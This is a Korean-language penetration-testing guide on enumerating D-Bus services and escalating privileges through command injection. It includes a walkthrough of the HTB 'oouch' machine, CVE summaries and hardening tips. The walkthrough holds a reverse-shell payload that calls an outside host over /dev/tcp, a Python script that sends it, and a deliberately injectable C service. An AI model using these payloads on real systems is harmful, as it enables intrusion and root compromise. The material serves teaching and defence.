# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI 열거**

D-Bus는 Ubuntu 데스크톱 환경에서 프로세스 간 통신(IPC) 중재자로 사용됩니다. Ubuntu에서는 여러 메시지 버스가 동시에 동작합니다. 주로 **권한이 있는 서비스가 시스템 전반에서 사용할 수 있는 서비스를 노출하는** 시스템 버스와, 로그인한 사용자마다 하나씩 존재하며 해당 사용자만 사용할 수 있는 서비스를 노출하는 세션 버스가 있습니다. 권한 상승이 목표이므로, 여기서는 더 높은 권한(예: root)으로 실행되는 서비스와 연관된 시스템 버스에 주로 초점을 맞춥니다. D-Bus 아키텍처에서는 세션 버스마다 '라우터'를 두며, 라우터는 클라이언트가 통신하려는 서비스의 주소를 기반으로 클라이언트 메시지를 적절한 서비스로 전달합니다.<sup>[[1]](#references)</sup>

D-Bus의 서비스는 서비스가 노출하는 **객체**와 **인터페이스**로 정의됩니다. 객체는 일반적인 OOP 언어의 클래스 인스턴스와 비슷하며, 각 인스턴스는 **객체 경로**로 고유하게 식별됩니다. 파일 시스템 경로와 유사한 이 경로는 서비스가 노출하는 각 객체를 고유하게 식별합니다. 조사할 때 중요한 인터페이스는 **org.freedesktop.DBus.Introspectable**이며, 여기에는 Introspect라는 단일 메서드가 있습니다. 이 메서드는 객체가 지원하는 메서드, 시그널, 속성을 XML 형식으로 반환합니다. 여기서는 속성과 시그널은 제외하고 메서드에 초점을 맞춥니다.

D-Bus 인터페이스와 통신하기 위해 두 가지 도구를 사용했습니다. 스크립트에서 D-Bus가 노출하는 메서드를 쉽게 호출할 수 있는 CLI 도구인 **gdbus**와, 각 버스에서 사용 가능한 서비스를 열거하고 각 서비스에 포함된 객체를 표시하도록 설계된 Python 기반 GUI 도구인 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)입니다.

```bash
sudo apt-get install d-feet
```

**session bus**를 확인하는 경우, 먼저 현재 주소를 확인하세요:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

첫 번째 이미지에는 D-Bus system bus에 등록된 서비스가 표시되어 있으며, System Bus 버튼을 선택한 후 **org.debin.apt**가 특별히 강조되어 있습니다. D-Feet는 이 서비스에 객체를 쿼리하고, 두 번째 이미지에서 볼 수 있듯이 선택한 객체의 인터페이스, 메서드, 속성 및 신호를 표시합니다. 각 메서드의 시그니처도 자세히 표시됩니다.

주목할 만한 기능은 서비스의 **process ID (pid)**와 **command line**을 표시하는 것입니다. 이는 서비스가 상승된 권한으로 실행되는지 확인하는 데 유용하며, 연구와 관련해 중요합니다.

**D-Feet는 메서드 호출도 지원합니다**: 사용자는 매개변수로 Python 표현식을 입력할 수 있으며, D-Feet는 이를 D-Bus 타입으로 변환한 다음 서비스에 전달합니다.

다만 일부 메서드는 호출을 허용하기 전에 인증을 요구합니다. 애초에 목표는 자격 증명 없이 권한을 상승시키는 것이므로, 이러한 메서드는 무시하겠습니다.

또한 일부 서비스는 사용자가 특정 작업을 수행하도록 허용해야 하는지 여부를 다른 D-Bus 서비스인 org.freedeskto.PolicyKit1에 쿼리하기도 합니다.

## **명령줄 열거**

### 서비스 객체 나열

다음 명령어로 열린 D-Bus 인터페이스를 나열할 수 있습니다:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

**`(activatable)`**로 표시된 서비스는 **아직 실행 중이 아니지만**, 버스 요청으로 필요할 때 시작할 수 있으므로 특히 흥미롭습니다. `busctl list`에서 멈추지 말고, 해당 이름을 실제 실행될 바이너리에 연결해 확인하세요.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

그러면 activatable name에 대해 어떤 `Exec=` 경로가 어떤 identity로 시작되는지 빠르게 알 수 있습니다. 바이너리나 실행 체인이 제대로 보호되지 않는다면, 비활성 서비스도 여전히 privilege-escalation 경로가 될 수 있습니다.

권한이 높은 USB 이미징 서비스의 경우, system-bus name을 이미지 쓰기 작업에 적용되는 **effective** policy와 대조하세요. 레거시 vendor rule이 관리자 Unix group에 암호 입력 없이 `ResultActive=yes`를 부여할 수 있습니다. 현재 계정이 해당 group에 속하는지, session이 active 상태인지, rule이 실제로 로드되어 있으며 다른 설정에 의해 재정의되지 않았는지, 설치된 helper가 여전히 호출자가 선택한 source 및 destination 경로를 허용하는지 확인하세요. 서비스 descriptor나 오래된 package 버전만으로는 임의의 파일에 접근할 수 있음을 입증하지 못합니다. activation descriptor가 없다고 해서 이미 실행 중인 서비스가 없다는 뜻도 아닙니다. 이미지 쓰기 method를 호출하지 말고 고정된 policy 및 service 파일을 검사하세요. [original service analysis](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)를 참고하세요.

#### 연결

[wikipedia에서:](https://en.wikipedia.org/wiki/D-Bus) 프로세스가 bus에 연결을 설정하면, bus는 해당 연결에 _unique connection name_이라는 특수한 bus name을 할당합니다. 이 유형의 bus name은 변경할 수 없습니다. 연결이 유지되는 동안에는 바뀌지 않으며, 더 중요한 점은 bus의 수명 동안 재사용되지 않는다는 것입니다. 즉, 같은 프로세스가 bus 연결을 종료하고 새 연결을 만들더라도 다른 어떤 연결에도 해당 unique connection name이 할당되지 않습니다. unique connection name은 다른 용도로는 허용되지 않는 콜론 문자로 시작하므로 쉽게 알아볼 수 있습니다.<sup>[[4]](#references)</sup>

### Service Object 정보

그런 다음 다음 명령으로 interface에 대한 정보를 얻을 수 있습니다:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

또한 버스 이름을 해당 `systemd` 유닛 및 실행 파일 경로와 연관 지으세요:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

privesc 중 실제로 중요한 운영상 질문에 답합니다. **메서드 호출이 성공하면, 실제로 어떤 바이너리와 유닛이 작업을 수행할까요?**

### 서비스 객체의 인터페이스 나열

충분한 권한이 있어야 합니다.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### 서비스 객체의 인터페이스 introspect하기

이 예시에서는 `tree` 매개변수를 사용해 발견된 최신 인터페이스를 선택했습니다 (_이전 섹션 참고_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

인터페이스 `htb.oouch.Block`의 `.Block` 메서드(우리가 관심 있는 메서드)에 주목하세요. 다른 열의 “s”는 문자열을 기대한다는 의미일 수 있습니다.

위험한 작업을 시도하기 전에 **읽기 지향** 메서드나 그 밖의 위험성이 낮은 메서드부터 검증하세요. 이렇게 하면 구문이 잘못된 경우, 접근은 가능하지만 거부되는 경우, 접근 가능하고 허용되는 경우를 명확히 구분할 수 있습니다.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### D-Bus 메서드와 정책 및 동작 연관 짓기

Introspection을 통해 **무엇을** 호출할 수 있는지는 알 수 있지만, 호출이 허용되거나 거부되는 **이유**는 알 수 없습니다. 실제 privesc triage에서는 보통 다음 **세 가지 계층**을 함께 살펴봐야 합니다.

1. **Activation metadata** (`.service` files 또는 `SystemdService=`)를 확인해 실제로 실행될 바이너리와 unit을 파악합니다.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`)를 확인해 누가 `own`, `send_destination`, `receive_sender`를 사용할 수 있는지 파악합니다.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`)을 확인해 기본 authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`)을 파악합니다.

유용한 명령어:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. 같은 method라도 수정 대상 object나 runtime context에 따라 다른 action을 선택할 수 있습니다. 따라서 실용적인 workflow는 다음과 같습니다.

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose`를 실행하고 관련 `.policy` 파일에서 grep
3. `busctl call`, `gdbus call` 또는 `dbusmap --enable-probes --null-agent`를 사용한 low-risk live probe

Proxy 또는 호환성 서비스는 특히 주의해야 합니다. root로 실행되는 proxy가 자체적으로 사전 수립한 connection을 통해 다른 D-Bus 서비스로 요청을 전달하면, 원래 호출자의 identity를 다시 검증하지 않는 한 backend가 모든 요청을 UID 0에서 온 것으로 잘못 처리할 수 있습니다.<sup>[[3]](#references)</sup>

### 모니터링/캡처 인터페이스

충분한 권한이 있으면(D-Bus의 `send_destination` 및 `receive_sender` 권한만으로는 충분하지 않음) **D-Bus 통신을 모니터링**할 수 있습니다.

**통신을 모니터링**하려면 **root**여야 합니다. root인데도 문제가 발생한다면 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 및 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)를 확인하세요.

> [!WARNING]
> D-Bus config 파일을 설정해 **root가 아닌 사용자가 통신을 sniff하도록 허용하는 방법**을 알고 있다면 **저에게 연락해 주세요**!

모니터링하는 여러 방법:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

다음 예제에서는 인터페이스 `htb.oouch.Block`이 모니터링되고 **메시지 "**_**lalalalal**_**"가 잘못된 통신을 통해 전송됩니다**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Wireshark에서 열 수 있는 **pcapng** 파일에 결과를 저장하려면 `monitor` 대신 `capture`를 사용할 수 있습니다:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### 모든 불필요한 정보 필터링 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

버스에 정보가 너무 많다면 다음과 같이 match rule을 전달하세요:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

여러 규칙을 지정할 수 있습니다. 메시지가 규칙 중 _하나라도_ 일치하면 해당 메시지가 출력됩니다. 예를 들면 다음과 같습니다:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

[D-Bus 문서](http://dbus.freedesktop.org/doc/dbus-specification.html)에서 match rule 구문에 대한 자세한 내용을 확인할 수 있습니다.<sup>[[7]](#references)</sup>

### 더 보기

`busctl`에는 더 많은 옵션이 있습니다. [**여기에서 모든 옵션을 확인하세요**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **취약한 시나리오**

HTB의 호스트 "oouch"에서 사용자 **qtc**로서 _/etc/dbus-1/system.d/htb.oouch.Block.conf_에 있는 **예상치 못한 D-Bus config 파일**을 찾을 수 있습니다:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

이전 설정에서 확인했듯이, 이 D-BUS 통신을 통해 정보를 주고받으려면 **root** 또는 **www-data** 사용자여야 합니다.

docker container **aeb4525789d8**에서 **qtc** 사용자로 다음 파일의 dbus 관련 코드를 확인할 수 있습니다: _/code/oouch/routes.py._ 관련 코드는 다음과 같습니다:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

As you can see, it is **D-Bus interface에 연결**하고 **"Block" function**에 "client_ip"를 전달합니다.

D-Bus 연결의 반대편에서는 C로 컴파일된 바이너리가 실행 중입니다. 이 코드는 D-Bus 연결에서 **IP 주소를 수신하고 `system` function을 통해 iptables를 호출**하여 지정된 IP 주소를 차단합니다.\
**`system` 호출은 의도적으로 command injection에 취약하게 작성되어 있으므로**, 다음과 같은 payload를 사용하면 reverse shell을 생성할 수 있습니다: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

이 페이지 끝에서 **D-Bus 애플리케이션의 전체 C 코드**를 확인할 수 있습니다. 코드의 91~97행 사이에서 **`D-Bus object path`와 `interface name`을 등록하는 방법**을 확인할 수 있습니다. 이 정보는 D-Bus 연결에 데이터를 전송할 때 필요합니다:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

또한 57번째 줄에서 이 D-Bus 통신에 등록된 **유일한 메서드**의 이름이 `Block`임을 확인할 수 있습니다(_**따라서 다음 섹션에서는 payloads를 서비스 객체 `htb.oouch.Block`, 인터페이스 `/htb/oouch/Block`, 메서드 이름 `Block`으로 전송합니다**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

다음 Python 코드는 `block_iface.Block(runme)`를 통해 payload를 D-Bus connection의 `Block` method로 보냅니다 (_이전 코드 조각에서 추출했음에 유의_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl 및 dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send`는 “Message Bus”에 메시지를 보내는 데 사용하는 도구입니다.
- Message Bus – 애플리케이션 간 통신을 쉽게 해주는 시스템용 소프트웨어입니다. Message Queue(메시지를 순서대로 처리함)와 관련이 있지만, Message Bus에서는 구독 모델로 메시지를 전송하며 속도도 매우 빠릅니다.
- “-system” 태그는 기본값인 세션 메시지가 아니라 시스템 메시지임을 지정하는 데 사용됩니다.
- “–print-reply” 태그는 메시지를 적절히 출력하고 응답을 사람이 읽을 수 있는 형식으로 표시하는 데 사용됩니다.
- “–dest=Dbus-Interface-Block”은 Dbus 인터페이스의 주소입니다.
- “–string:”은 인터페이스에 보낼 메시지의 유형입니다. double, bytes, booleans, int, objpath 등 메시지를 보내는 형식은 여러 가지입니다. 이 중 “object path”는 파일 경로를 Dbus 인터페이스에 보낼 때 유용합니다. 이 경우 FIFO 같은 특수 파일을 사용해 파일 이름을 통해 인터페이스에 명령을 전달할 수 있습니다. “string:;”은 FIFO reverse shell 파일/명령을 배치한 object path를 다시 호출하는 것입니다.

_`htb.oouch.Block.Block`에서 첫 부분(`htb.oouch.Block`)은 service object를, 마지막 부분(`.Block`)은 method 이름을 가리킵니다._

### C 코드

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## 자동화된 열거 도구 (2023-2025)

`busctl`/`gdbus`를 사용해 대규모 D-Bus attack surface를 수동으로 열거하는 일은 금방 번거로워집니다. 최근 몇 년 사이에 출시된 두 가지 소규모 FOSS 유틸리티를 사용하면 red-team 또는 CTF 활동 중 작업 속도를 높일 수 있습니다.

### dbusmap (”D-Bus용 Nmap”)
* 작성자: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C로 작성되었으며, 모든 object path를 순회하고 `Introspect` XML을 가져온 다음 소유한 PID/UID에 매핑하는 단일 정적 바이너리(<50 kB)입니다.<sup>[[5]](#references)</sup>
* 유용한 플래그:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* 이 도구는 보호되지 않은 well-known name에 `!`를 표시해, *장악*할 수 있는(탈취할 수 있는) 서비스나 권한이 낮은 셸에서 접근 가능한 메서드 호출을 즉시 보여 줍니다.

### uptux.py
* 작성자: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* systemd unit의 *쓰기 가능한* 경로와 과도하게 허용적인 D-Bus policy 파일(예: `send_destination="*"`)을 찾아내는 Python 전용 스크립트입니다.<sup>[[6]](#references)</sup>
* 빠른 사용법:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* D-Bus 모듈은 아래 디렉터리를 검색하고 일반 사용자가 spoofing 또는 hijacking할 수 있는 서비스를 강조 표시합니다.
  * `/etc/dbus-1/system.d/` 및 `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (벤더 오버라이드)

---

## 주목할 만한 D-Bus 권한 상승 취약점 (2024-2025)

최근 공개된 CVE를 살펴보면 자체 코드에서 유사한 취약한 패턴을 발견하는 데 도움이 됩니다. 최근 사례 두 가지를 살펴보겠습니다:<sup>[[2]](#references)[[3]](#references)</sup>

| 연도 | CVE | 구성 요소 | 근본 원인 | 공격 관점의 교훈 |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root로 실행되는 서비스가 권한이 없는 사용자가 재구성할 수 있는 D-Bus 인터페이스를 노출했습니다. 여기에는 공격자가 제어하는 매크로 동작을 불러오는 기능도 포함됐습니다. | 데몬이 시스템 버스에서 **장치/프로필/구성 관리** 기능을 노출한다면, 쓰기 가능한 구성과 매크로 기능을 단순한 "설정"이 아니라 코드 실행 프리미티브로 간주하세요. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root로 실행되는 호환성 프록시가 원래 호출자의 보안 컨텍스트를 보존하지 않은 채 백엔드 서비스로 요청을 전달해, 백엔드가 프록시를 UID 0으로 신뢰했습니다. | **프록시 / 브리지 / 호환성** D-Bus 서비스는 별도의 버그 유형으로 간주하세요. 권한이 부여된 호출을 중계한다면 호출자의 UID/Polkit 컨텍스트가 백엔드에 어떻게 전달되는지 확인하세요. |

다음 패턴에 주목하세요:
1. 서비스가 **시스템 버스에서 root로 실행**됩니다.
2. **권한 확인이 없거나**, 확인 대상이 **잘못된 주체**입니다.
3. 호출 가능한 메서드가 결국 패키지 설치, 사용자/그룹 변경, 부트로더 구성, 장치 프로필 업데이트, 파일 쓰기 또는 직접 명령 실행 등 시스템 상태를 변경합니다.

`dbusmap --enable-probes` 또는 수동 `busctl call`을 사용해 메서드에 접근할 수 있는지 확인한 다음, 서비스의 정책 XML과 Polkit 액션을 살펴보고 실제로 **어떤 주체**를 대상으로 권한을 확인하는지 파악하세요.

---

## 강화 및 탐지: 빠른 개선 방법

* 모든 사용자에게 쓰기 권한이 있거나 *send/receive*가 허용된 정책을 검색하세요:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* 위험한 메서드에는 Polkit을 요구하세요. *root* 프록시조차 자신의 PID가 아니라 *호출자*의 PID를 `polkit_authority_check_authorization_sync()`에 전달해야 합니다.
* 장시간 실행되는 헬퍼는 권한을 낮추세요(버스에 연결한 후 `sd_pid_get_owner_uid()`를 사용해 namespace를 전환).
* 서비스를 제거할 수 없다면 전용 Unix 그룹으로 범위를 제한하고 XML policy에서 접근을 제한하세요.
* 블루팀: `busctl capture > /var/log/dbus_$(date +%F).pcapng`로 system bus를 캡처하고 Wireshark로 가져와 이상 징후를 탐지하세요.

---

## References

- [1] [Ubuntu Desktop의 USBCreator D-Bus 권한 상승](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus 서비스에서 권한 없는 사용자가 모두 설정을 변경할 수 있음](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Deepin D-Bus Proxy Service의 인증 우회(CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
